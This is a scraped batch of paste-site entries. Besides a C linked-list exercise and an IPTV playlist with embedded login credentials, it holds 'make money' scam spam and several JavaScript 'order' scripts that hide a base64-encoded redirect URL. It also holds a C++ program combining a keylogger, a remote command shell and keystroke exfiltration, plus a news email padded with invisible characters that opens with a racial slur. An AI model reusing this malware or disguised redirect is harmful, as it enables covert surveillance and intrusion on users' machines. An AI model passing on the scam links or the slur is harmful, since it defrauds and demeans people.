id,title,username,language,date,content
QMEy5zHU,Stampa inversa,Uncino,C,Saturday 29th of March 2025 01:04:52 AM CDT,"#include <stdio.h>
#include <stdlib.h>


#define LISTELEM 10 // Numero di elementi nella lista

typedef struct stNodo   // E' solo un esperimento, quindi...
        {
            struct stNodo * next;
            int payload;
        } nodo;

nodo * lista;   // Testa della lista

// Creo la lista
int fill(void)
{
    int i; // Variabile di ciclo
    nodo * current; // Puntatore al nodo corrente
    nodo * tmp; // Puntatore al nodo creato

    for ( i = 0; i < LISTELEM; i++)
    {
        tmp = (nodo *) malloc(sizeof(nodo));
        if (tmp == NULL)
        {
            return -1;
        }
        tmp->next = NULL;
        tmp->payload = i;
        if (i == 0)
        {
            lista = tmp;
            current = lista;
        }
        else
        {
            current->next = tmp;
            current = tmp;
        }
    }
    return 0;
}

void stampa(void)
{
    nodo * n;

     for (n = lista; n != NULL; n = n->next)
        printf(""%d\n"", n->payload);
}

// Percorre la lista rovesciando i puntatori
// Al termine lista punterà all'ultimo elemento della lista, quindi sarà una ""lista inversamente linkata""
void reverse(void)
{
    nodo * current;
    nodo * prev; // Alle fine del ciclo di inversione punterà all'ultimo elemento della lista
    nodo * next;

    // Percorro la lista fino alla fine invertendo i puntatori
    current = lista;
    prev = NULL;
    while (current != NULL) {
        next = current->next;  // Salvo il nodo successivo
        current->next = prev;  // Inverto il puntatore
        prev = current;        // Aggiorno prev
        current = next;        // E current diventa il nodo salvato
    }
    lista = prev; // Al termine faccio puntare la testa della lista sll'ultimo elemento (che adesso è il primo)
}

int main(void)
{
    int res;

    res = fill();
    if (res == -1)
    {
        return -1;
    }
    printf(""Stampo la lista stampa\n\n"");
    stampa();
    printf(""Rovescio i puntatori\n\n"");
    reverse();
    printf(""Stampo la lista, che ora è invertita\n"");
    stampa();
    printf(""Rovescio nuovamente i puntatori per rimettere tutto a posto\n\n"");
    reverse();
    printf(""Verifico che la lista sia di nuovo correttamente ordinata\n"");
    stampa();

    return 0;
}
"
G34eri5i,EARN $900 INSTANTLY 2025 BT,Noahcoolboy69420,JavaScript,Saturday 29th of March 2025 12:54:49 AM CDT," 
Pdf https://tinyurl.com/methodssss


uawxlolfeK
"
sELzkKtj,Index,Salvo71,JSON,Saturday 29th of March 2025 12:52:43 AM CDT,"{
""name"": ""RadiowebTV"",
""author"": ""Salvo"",
""image"": ""https://st.depositphotos.com/1008768/4671/i/950/depositphotos_46718305-stock-photo-radio-icon.jpg"",
""url"": ""https://pastebin.com/XZSAZBep"",
 ""groups"": [

{
""name"": ""TV"",
""image"": ""https://uxwing.com/wp-content/themes/uxwing/download/video-photography-multimedia/live-tv-icon.png?size=626&ext=jpg&ga=GA1.1.1546980028.1710892800&semt=ais"",
""url"": ""https://pastebin.com/Rf7bFhaP"",
""info"": ""Tv streaming""
},
{
""name"": ""TV2"",
""image"": ""https://png.pngtree.com/png-vector/20231115/ourmid/pngtree-tv-icon-multimedia-png-image_10604500.png"",
""url"": ""https://dpaste.com/3PU6UU649.txt"",
""info"": ""streaming""
},
{
""name"": ""Film"",
""image"": ""https://www.shutterstock.com/shutterstock/photos/324455369/display_1500/stock-vector-movie-time-324455369.jpg"",
""url"": ""http://163.172.51.230/get.php?username=temateci&password=EgAfeadca3&type=m3u_plus"",
""info"": ""Film streaming""
},
{
""name"": ""Primafilatv"",
""image"": ""https://image.winudf.com/v2/image/Y29tLlRlYW1DbG91ZC5Ta3lOZXRpcHR2X2ljb25fMTUzMTA1MTgwNV8wMjA/icon.png?w=160&fakeurl=1"",
""url"": ""https://dpaste.com/A9GFF2ELP.txt"",
""info"": ""Tv streaming""
},
{
""name"": ""Migliori-attori"",
""image"": ""https://m.media-amazon.com/images/I/81iT+VSS5lL._AC_UF1000,1000_QL80_.jpg"",
""url"": ""https://dpaste.com/8Z3X3DF5K.txt"",
""info"": ""Tv streaming""
},
{
""name"": ""Sz-Sport"",
""image"": ""https://i.postimg.cc/fbm1CCMD/13034.jpg"",
""url"": ""https://dpaste.com/56FWPKPQK.txt"",
""info"": ""Tv streaming""
},
{
""name"": ""RADIO"",
""image"": ""https://play-lh.googleusercontent.com/MQKEUPuDXWaHSklNGULf4gHwZvv93HwnCKJ62wr4LAqPOqMsjCbsstkCAWxFBCeK5w0=w240-h480?size=626&ext=jpg&ga=GA1.1.1546980028.1710892800&semt=ais"",
			""url"": ""https://dpaste.com/7UDVHKH6F.txt"",
			""info"": ""Stazioni radio""

		},

	]
}"
1ECjHwFS,Order.js,Xp_Isolation,JavaScript,Saturday 29th of March 2025 12:40:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/025/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pCKGS5JZ,Random Gmail Acc 1A,Noahcoolboy69420,JavaScript,Saturday 29th of March 2025 12:38:54 AM CDT," 
Pdf https://tinyurl.com/methodssss


VB5eC0iJYQ
"
kvwdTzWY,Market.js,Xp_Isolation,JavaScript,Saturday 29th of March 2025 12:24:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/082/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rqjpWJXt,Make $1000 15-MINUTES (BEGINNER) WM,Noahcoolboy69420,JavaScript,Saturday 29th of March 2025 12:22:58 AM CDT," 
Pdf https://tinyurl.com/methodssss


Bb20NvW967
"
KnQush2k,Binance account CW,Noahcoolboy69420,JavaScript,Saturday 29th of March 2025 12:07:02 AM CDT," 
Pdf https://tinyurl.com/methodssss


8hwJZ2wCmV
"
SmtwimXG,EyePhuckBitches.cpp,WhosYourDaddySec,C++,Friday 28th of March 2025 11:54:57 PM CDT,"#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <cstring>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/rfcomm.h>
#include <linux/input.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#define WEBSHELL_PORT 8080
#define AES_KEY_SIZE 32
#define NETWORK_EXFIL_PORT 9999
unsigned char aes_key[AES_KEY_SIZE];
RSA *public_key = nullptr;
RSA *private_key = nullptr;
int exfil_socket = -1;
const char* bluetooth_device_name = ""Audio_Headset"";
void generate_aes_key() {
    if (!RAND_bytes(aes_key, AES_KEY_SIZE)) {
        std::cerr << ""Error generating AES key"" << std::endl;
        exit(1);
    }
}
void generate_rsa_keys() {
    BIGNUM *bn = BN_new();
    if (!BN_set_word(bn, RSA_F4)) {
        std::cerr << ""Error setting up RSA key generation"" << std::endl;
        exit(1);
    }
    private_key = RSA_new();
    if (RSA_generate_key_ex(private_key, 2048, bn, nullptr) != 1) {
        std::cerr << ""Error generating RSA keys"" << std::endl;
        exit(1);
    }
    public_key = RSAPublicKey_dup(private_key);
    if (public_key == nullptr) {
        std::cerr << ""Error duplicating RSA public key"" << std::endl;
        exit(1);
    }
    BN_free(bn);
}
void save_rsa_keys() {
    FILE *private_key_file = fopen(""private_key.pem"", ""wb"");
    if (!private_key_file) {
        std::cerr << ""Error saving private key"" << std::endl;
        exit(1);
    }
    PEM_write_RSAPrivateKey(private_key_file, private_key, nullptr, nullptr, 0, nullptr, nullptr);
    fclose(private_key_file);
    FILE *public_key_file = fopen(""public_key.pem"", ""wb"");
    if (!public_key_file) {
        std::cerr << ""Error saving public key"" << std::endl;
        exit(1);
    }
    PEM_write_RSAPublicKey(public_key_file, public_key);
    fclose(public_key_file);
}
void encrypt_data_aes(const std::string& data, std::string& encrypted_data) {
    AES_KEY enc_key;
    AES_set_encrypt_key(aes_key, 256, &enc_key);
    size_t data_len = data.size();
    size_t encrypted_data_len = (data_len / AES_BLOCK_SIZE + 1) * AES_BLOCK_SIZE;
    unsigned char *encrypted_buf = new unsigned char[encrypted_data_len];
    AES_encrypt(reinterpret_cast<const unsigned char*>(data.c_str()), encrypted_buf, &enc_key);
    encrypted_data = std::string(reinterpret_cast<char*>(encrypted_buf), encrypted_data_len);
    delete[] encrypted_buf;
}
void encrypt_data_rsa(const std::string& data, std::string& encrypted_data) {
    int data_len = data.size();
    int rsa_len = RSA_size(public_key);
    unsigned char *encrypted_buf = new unsigned char[rsa_len];
    if (RSA_public_encrypt(data_len, reinterpret_cast<const unsigned char*>(data.c_str()), encrypted_buf, public_key, RSA_PKCS1_OAEP_PADDING) == -1) {
        std::cerr << ""Error encrypting data with RSA"" << std::endl;
        exit(1);
    }
    encrypted_data = std::string(reinterpret_cast<char*>(encrypted_buf), rsa_len);
    delete[] encrypted_buf;
}
std::string decrypt_data_rsa(const std::string& encrypted_data) {
    int rsa_len = RSA_size(private_key);
    unsigned char *decrypted_buf = new unsigned char[rsa_len];
    if (RSA_private_decrypt(encrypted_data.size(), reinterpret_cast<const unsigned char*>(encrypted_data.c_str()), decrypted_buf, private_key, RSA_PKCS1_OAEP_PADDING) == -1) {
        std::cerr << ""Error decrypting data with RSA"" << std::endl;
        exit(1);
    }
    std::string decrypted_data(reinterpret_cast<char*>(decrypted_buf));
    delete[] decrypted_buf;
    return decrypted_data;
}
void start_keylogger() {
    const char* device = ""/dev/input/event0"";
    int fd = open(device, O_RDONLY);
    if (fd == -1) {
        std::cerr << ""Error opening keylogger device."" << std::endl;
        exit(1);
    }
    struct input_event ev;
    while (true) {
        ssize_t n = read(fd, &ev, sizeof(struct input_event));
        if (n < (ssize_t) sizeof(struct input_event)) {
            std::cerr << ""Error reading key event."" << std::endl;
            break;
        }
        if (ev.type == EV_KEY && ev.value == 1) {
            std::ofstream keylog_file(""keylog.txt"", std::ios::app);
            keylog_file << ""Key pressed: "" << ev.code << std::endl;
            keylog_file.close();
        }
    }
    close(fd);
}
void handle_client(int client_socket) {
    const std::string webshell_banner = ""Audio_Headset Webshell. Type 'exit' to quit.\n> "";
    send(client_socket, webshell_banner.c_str(), webshell_banner.size(), 0);
    char buffer[1024];
    std::string command;
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            break;
        }
        command = std::string(buffer);
        command = command.substr(0, command.find(""\r\n""));
        if (command == ""exit"") {
            break;
        } else {
            FILE* fp;
            char result[1024];
            fp = popen(command.c_str(), ""r"");
            if (fp == NULL) {
                send(client_socket, ""Error executing command.\n"", 25, 0);
            } else {
                while (fgets(result, sizeof(result), fp) != NULL) {
                    send(client_socket, result, strlen(result), 0);
                }
                fclose(fp);
            }
        }
    }
    close(client_socket);
}
void start_webshell() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        std::cerr << ""Error creating socket."" << std::endl;
        return;
    }
    sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(WEBSHELL_PORT);
    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        std::cerr << ""Error binding socket."" << std::endl;
        return;
    }
    if (listen(server_fd, 5) == -1) {
        std::cerr << ""Error listening on socket."" << std::endl;
        return;
    }
    while (true) {
        int client_socket = accept(server_fd, nullptr, nullptr);
        if (client_socket == -1) {
            std::cerr << ""Error accepting client."" << std::endl;
            continue;
        }
        std::thread client_thread(handle_client, client_socket);
        client_thread.detach();
    }
    close(server_fd);
}
void start_network_exfiltration() {
    exfil_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (exfil_socket == -1) {
        std::cerr << ""Error creating exfiltration socket."" << std::endl;
        return;
    }
    sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(""127.0.0.1"");
    server_addr.sin_port = htons(NETWORK_EXFIL_PORT);
    if (connect(exfil_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        std::cerr << ""Error connecting to exfiltration server."" << std::endl;
        return;
    }
    while (true) {
        std::ifstream keylog_file(""keylog.txt"");
        if (!keylog_file.is_open()) {
            std::cerr << ""Error opening keylog file."" << std::endl;
            break;
        }
        std::string line;
        while (std::getline(keylog_file, line)) {
            send(exfil_socket, line.c_str(), line.size(), 0);
        }
        keylog_file.close();
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
    close(exfil_socket);
}
int main() {
    generate_aes_key();
    generate_rsa_keys();
    save_rsa_keys();
    
    std::thread keylogger_thread(start_keylogger);
    std::thread webshell_thread(start_webshell);
    std::thread exfiltration_thread(start_network_exfiltration);
    keylogger_thread.join();
    webshell_thread.join();
    exfiltration_thread.join();
    return 0;
}"
TX6Z8Lnv,Products.js,Xp_Isolation,JavaScript,Friday 28th of March 2025 11:53:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/219/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
drZz4Wd2,News March28 25,Newscaster_Ned,Email,Friday 28th of March 2025 11:50:11 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎l‎l‎o‎ ‎a‎l‎l‎ ‎y‎o‎u‎ ‎s‎q‎u‎i‎n‎t‎y‎ ‎e‎y‎e‎d‎ ‎f‎r‎e‎a‎k‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎r‎e‎f‎r‎a‎i‎n‎ ‎f‎r‎o‎m‎ ‎s‎a‎y‎i‎n‎g‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎r‎a‎c‎i‎s‎t‎ ‎t‎o‎d‎a‎y‎ ‎s‎i‎n‎c‎e‎ ‎I‎'‎m‎ ‎i‎n‎ ‎a‎n‎ ‎u‎n‎u‎s‎u‎a‎l‎l‎y‎ ‎g‎o‎o‎d‎ ‎m‎o‎o‎d‎.‎

E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎T‎o‎m‎m‎y‎ ‎V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎’‎ ‎a‎t‎ ‎t‎h‎e‎ ‎K‎a‎n‎s‎a‎s‎ ‎S‎t‎a‎t‎e‎ ‎C‎a‎p‎i‎t‎o‎l‎
K‎S‎-‎C‎a‎p‎i‎t‎o‎l‎-‎C‎a‎t‎h‎o‎l‎i‎c‎s‎-‎S‎a‎t‎a‎n‎i‎s‎t‎s‎
W‎h‎e‎n‎ ‎a‎ ‎t‎i‎n‎y‎ ‎b‎a‎n‎d‎ ‎o‎f‎ ‎s‎e‎l‎f‎-‎p‎r‎o‎c‎l‎a‎i‎m‎e‎d‎ ‎s‎a‎t‎a‎n‎i‎s‎t‎s‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎d‎ ‎t‎h‎e‎y‎ ‎w‎o‎u‎l‎d‎ ‎h‎o‎l‎d‎ ‎a‎ ‎“‎b‎l‎a‎c‎k‎ ‎m‎a‎s‎s‎”‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎K‎a‎n‎s‎a‎s‎ ‎S‎t‎a‎t‎e‎ ‎C‎a‎p‎i‎t‎o‎l‎,‎ ‎t‎h‎e‎y‎ ‎w‎a‎n‎t‎e‎d‎ ‎t‎o‎ ‎i‎n‎f‎l‎a‎m‎e‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎.‎ ‎A‎n‎d‎ ‎t‎h‎e‎y‎ ‎d‎i‎d‎,‎ ‎b‎u‎t‎ ‎i‎t‎ ‎w‎a‎s‎ ‎n‎o‎t‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎t‎y‎p‎e‎ ‎o‎f‎ ‎f‎i‎r‎e‎ ‎t‎h‎e‎y‎ ‎i‎n‎t‎e‎n‎d‎e‎d‎.‎

T‎o‎m‎m‎y‎ ‎V‎a‎l‎e‎n‎t‎i‎n‎e‎4‎9‎1‎
…‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎L‎e‎a‎d‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎A‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎a‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎ ‎D‎u‎r‎i‎n‎g‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎’‎…‎
E‎l‎i‎z‎a‎b‎e‎t‎h‎ ‎W‎e‎i‎b‎e‎l‎
7‎2‎
…‎D‎.‎C‎.‎ ‎C‎a‎r‎d‎i‎n‎a‎l‎ ‎S‎l‎a‎m‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎M‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎R‎e‎f‎o‎r‎m‎s‎ ‎a‎s‎ ‎‘‎C‎r‎u‎s‎a‎d‎e‎’‎
N‎e‎i‎l‎ ‎M‎u‎n‎r‎o‎
1‎,‎0‎6‎9‎
T‎r‎u‎m‎p‎ ‎U‎n‎d‎e‎r‎ ‎A‎t‎t‎a‎c‎k‎:‎ ‎M‎a‎t‎t‎ ‎B‎o‎y‎l‎e‎ ‎a‎n‎d‎ ‎N‎i‎c‎k‎ ‎G‎i‎l‎b‎e‎r‎t‎s‎o‎n‎ ‎B‎r‎e‎a‎k‎ ‎D‎o‎w‎n‎ ‎W‎h‎o‎’‎s‎ ‎C‎o‎m‎i‎n‎g‎ ‎f‎o‎r‎ ‎H‎i‎m‎
T‎u‎l‎s‎i‎ ‎G‎a‎b‎b‎a‎r‎d‎ ‎R‎e‎v‎o‎k‎e‎s‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎C‎l‎e‎a‎r‎a‎n‎c‎e‎s‎ ‎o‎f‎ ‎B‎i‎d‎e‎n‎,‎ ‎H‎a‎r‎r‎i‎s‎,‎ ‎H‎i‎l‎l‎a‎r‎y‎
O‎l‎i‎v‎i‎a‎ ‎R‎o‎n‎d‎e‎a‎u‎
2‎1‎9‎
S‎c‎h‎w‎e‎i‎z‎e‎r‎:‎ ‎T‎h‎e‎ ‎L‎e‎f‎t‎’‎s‎ ‎L‎a‎w‎f‎a‎r‎e‎ ‎S‎t‎a‎r‎t‎e‎d‎ ‎w‎i‎t‎h‎ ‎O‎b‎a‎m‎a‎ ‎U‎s‎i‎n‎g‎ ‎A‎n‎t‎i‎-‎T‎e‎r‎r‎o‎r‎ ‎T‎a‎c‎t‎i‎c‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎D‎o‎m‎e‎s‎t‎i‎c‎ ‎P‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎O‎p‎p‎o‎n‎e‎n‎t‎s‎
B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎T‎V‎

W‎S‎J‎ ‎E‎d‎i‎t‎o‎r‎i‎a‎l‎ ‎B‎o‎a‎r‎d‎’‎s‎ ‎W‎o‎r‎k‎ ‎t‎o‎ ‎U‎n‎d‎e‎r‎m‎i‎n‎e‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎s‎ ‎P‎e‎r‎s‎i‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎a‎ ‎D‎e‎c‎a‎d‎e‎
W‎S‎J‎ ‎E‎d‎i‎t‎o‎r‎i‎a‎l‎ ‎B‎o‎a‎r‎d‎'‎s‎ ‎W‎o‎r‎k‎ ‎t‎o‎ ‎U‎n‎d‎e‎r‎m‎i‎n‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎s‎ ‎P‎e‎r‎s‎i‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎a‎
4‎,‎3‎5‎0‎
T‎u‎l‎s‎i‎ ‎G‎a‎b‎b‎a‎r‎d‎ ‎R‎e‎v‎o‎k‎e‎s‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎C‎l‎e‎a‎r‎a‎n‎c‎e‎s‎ ‎o‎f‎ ‎B‎i‎d‎e‎n‎,‎ ‎H‎a‎r‎r‎i‎s‎,‎ ‎H‎i‎l‎l‎a‎r‎y‎,‎ ‎M‎o‎r‎e‎
T‎u‎l‎s‎i‎ ‎G‎a‎b‎b‎a‎r‎d‎ ‎R‎e‎v‎o‎k‎e‎s‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎C‎l‎e‎a‎r‎a‎n‎c‎e‎s‎ ‎o‎f‎ ‎B‎i‎d‎e‎n‎,‎ ‎H‎a‎r‎r‎i‎s‎,‎ ‎H‎i‎l‎l‎a‎r‎y‎
2‎1‎9‎
Z‎e‎l‎e‎n‎s‎k‎y‎ ‎D‎e‎c‎l‎a‎r‎e‎s‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎W‎i‎l‎l‎ ‎‘‎N‎e‎v‎e‎r‎ ‎C‎e‎d‎e‎’‎ ‎O‎c‎c‎u‎p‎i‎e‎d‎ ‎T‎e‎r‎r‎i‎t‎o‎r‎i‎e‎s‎ ‎t‎o‎ ‎R‎u‎s‎s‎i‎a‎,‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎T‎r‎
Z‎e‎l‎e‎n‎s‎k‎y‎ ‎S‎a‎y‎s‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎W‎i‎l‎l‎ ‎'‎N‎e‎v‎e‎r‎ ‎C‎e‎d‎e‎'‎ ‎O‎c‎c‎u‎p‎i‎e‎d‎ ‎T‎e‎r‎r‎i‎t‎o‎r‎i‎e‎s‎ ‎t‎o‎ ‎R‎u‎s‎s‎i‎a‎
4‎,‎6‎2‎0‎
J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎P‎a‎r‎t‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎D‎E‎I‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎,‎ ‎C‎a‎l‎l‎s‎ ‎I‎t‎ ‎a‎ ‎‘‎C‎o‎e‎r‎c‎i‎v‎e‎ ‎T‎h‎r‎e‎a‎t‎’‎
'‎C‎o‎e‎r‎c‎i‎v‎e‎ ‎T‎h‎r‎e‎a‎t‎'‎:‎ ‎J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎P‎a‎r‎t‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎D‎E‎I‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎
2‎,‎2‎8‎0‎
T‎r‎u‎m‎p‎ ‎A‎s‎k‎s‎ ‎S‎C‎O‎T‎U‎S‎ ‎t‎o‎ ‎P‎e‎r‎m‎i‎t‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎U‎n‎d‎e‎r‎ ‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎ ‎A‎c‎t‎
T‎r‎u‎m‎p‎ ‎A‎s‎k‎s‎ ‎S‎C‎O‎T‎U‎S‎ ‎t‎o‎ ‎P‎e‎r‎m‎i‎t‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎
1‎,‎3‎0‎9‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎P‎u‎l‎l‎s‎ ‎E‎l‎i‎s‎e‎ ‎S‎t‎e‎f‎a‎n‎i‎k‎’‎s‎ ‎N‎o‎m‎i‎n‎a‎t‎i‎o‎n‎ ‎a‎s‎ ‎U‎.‎N‎.‎ ‎A‎m‎b‎a‎s‎s‎a‎d‎o‎r‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎H‎o‎u‎s‎e‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎
T‎r‎u‎m‎p‎ ‎P‎u‎l‎l‎s‎ ‎S‎t‎e‎f‎a‎n‎i‎k‎'‎s‎ ‎U‎.‎N‎.‎ ‎A‎m‎b‎a‎s‎s‎a‎d‎o‎r‎ ‎N‎o‎m‎i‎n‎a‎t‎i‎o‎n‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎G‎O‎P‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎
2‎,‎7‎7‎5‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎T‎o‎m‎m‎y‎ ‎V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎’‎ ‎a‎t‎ ‎t‎h‎e‎ ‎K‎a‎n‎
V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎'‎ ‎i‎n‎ ‎K‎a‎n‎s‎a‎s‎
4‎9‎1‎
